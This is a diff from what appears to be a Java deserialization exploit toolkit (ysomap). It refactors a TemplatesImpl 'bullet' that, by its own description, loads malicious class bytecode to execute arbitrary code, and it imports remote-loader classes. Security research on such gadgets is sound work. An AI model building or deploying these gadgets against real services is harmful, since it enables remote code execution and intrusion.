@@ -14,6 +14,7 @@ import loader.DnslogLoader;
 import loader.RemoteFileHttpExecutor;
 import loader.RemoteFileHttpLoader;
 import loader.RemoteFileLoader;
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
@@ -39,7 +40,7 @@ import java.util.UUID;
 @Authors({ Authors.WH1T3P1G })
 @Targets({Targets.JDK})
 @Details("载入恶意class字节码，并执行任意代码，依赖TemplatesImpl")
-public class TemplatesImplBullet implements Bullet<Object> {
+public class TemplatesImplBullet extends AbstractBullet<Object> {
 
     private Class templatesImpl;
     private Class abstractTranslet;
@@ -182,10 +183,10 @@ public class TemplatesImplBullet implements Bullet<Object> {
 
     public static Bullet newInstance(Object... args) throws Exception {
         Bullet bullet = new TemplatesImplBullet();
-        ReflectionHelper.set(bullet, "type", args[0]);
-        ReflectionHelper.set(bullet, "body", args[1]);
-        ReflectionHelper.set(bullet, "effect", args[2]);
-        ReflectionHelper.set(bullet, "exception", args[3]);
+        bullet.set("type", args[0]);
+        bullet.set("body", args[1]);
+        bullet.set("effect", args[2]);
+        bullet.set("exception", args[3]);
         return bullet;
     }
 }
